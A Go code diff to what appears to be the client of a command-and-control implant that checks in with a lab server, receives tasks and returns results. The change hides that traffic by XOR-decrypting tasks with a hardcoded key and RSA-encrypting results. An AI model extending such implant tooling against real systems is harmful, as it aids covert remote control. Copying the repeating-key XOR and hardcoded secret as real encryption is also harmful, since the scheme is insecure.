@@ -2,6 +2,7 @@ package client
 
 import (
 	"bytes"
+	"crypto/rsa"
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
@@ -78,7 +79,7 @@ var caCert string
 
 func init() {
 	ServerHostName = "192.168.56.1"
-	ServerSecret = "Test"
+	ServerSecret = "TestTestTestTest"
 	CheckedIn = false
 	CheckedInChan = make(chan interface{})
 	ClientDone = make(chan interface{})          // Channel to indicate that the receiverHandler is done
@@ -107,6 +108,14 @@ func InitializeClient() error {
 	return nil
 }
 
+func DecryptMessageWithSymKey(data []byte, key []byte) ([]byte, error) {
+	var output []byte
+	for i := 0; i < len(data); i++ {
+		output = append(output, data[i]^key[i%len(key)])
+	}
+	return output, nil
+}
+
 func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	var result string
 	var cmdError error
@@ -115,7 +124,15 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	m := &data.Message{}
 	t := &data.Task{}
 	err := json.Unmarshal(message, m)
-	err = json.Unmarshal(m.MessageData, t)
+	log.Printf("%+v", m)
+	// decrypt incoming task
+	decryptedTask, err := DecryptMessageWithSymKey(m.MessageData, []byte(ServerSecret))
+	if err != nil {
+		return err, nil
+	}
+	log.Println(string(decryptedTask))
+	err = json.Unmarshal(decryptedTask, t)
+	//err = json.Unmarshal(m.MessageData, t)
 	if err != nil {
 		log.Printf("Error Handling Task\n")
 		return err, nil
@@ -330,18 +347,18 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	}
 }
 
-func ClientHandleCheckInResp(message []byte) (error, string) {
+func ClientHandleCheckInResp(message []byte) (error, string, *rsa.PublicKey) {
 	m := &data.Message{}
 	c := &data.Client{}
 	err := json.Unmarshal(message, m)
 	if err != nil {
-		return err, ""
+		return err, "", nil
 	}
 	err = json.Unmarshal(m.MessageData, c)
 	if err != nil {
-		return err, ""
+		return err, "", nil
 	}
-	return nil, c.ClientId
+	return nil, c.ClientId, c.RsaPublicKey
 }
 
 func ClientDoCheckIn(client *data.Client) error {
@@ -379,10 +396,14 @@ func ClientReceiveHandler(client *data.Client) {
 		err, messageType := utils.CheckMessage(msg)
 		switch messageType {
 		case "CheckIn":
-			err, uuid := ClientHandleCheckInResp(msg)
+			err, uuid, publicKey := ClientHandleCheckInResp(msg)
 			if err != nil {
 				log.Fatal(err)
 			}
+			if publicKey == nil {
+				log.Fatal("Failed to get rsa key pair.")
+			}
+			Client.RsaPublicKey = publicKey
 			Client.ClientId = uuid
 			CheckedInChan <- true
 		case "Task":
@@ -390,9 +411,15 @@ func ClientReceiveHandler(client *data.Client) {
 			if err != nil {
 				log.Fatal(err)
 			}
+			// encrypt marshaled task result.
+			encryptedTaskResult, err := Client.EncryptMessageWithPubKey(res.ToBytes())
+			if err != nil {
+				log.Fatal(err)
+			}
 			d := data.Message{
 				MessageType: "TaskResult",
-				MessageData: res.ToBytes(),
+				//MessageData: res.ToBytes(),
+				MessageData: encryptedTaskResult,
 			}
 			connection.WriteMessage(d.ToBytes())
 			// handle tasks async ??? doable but idk needs more testing.
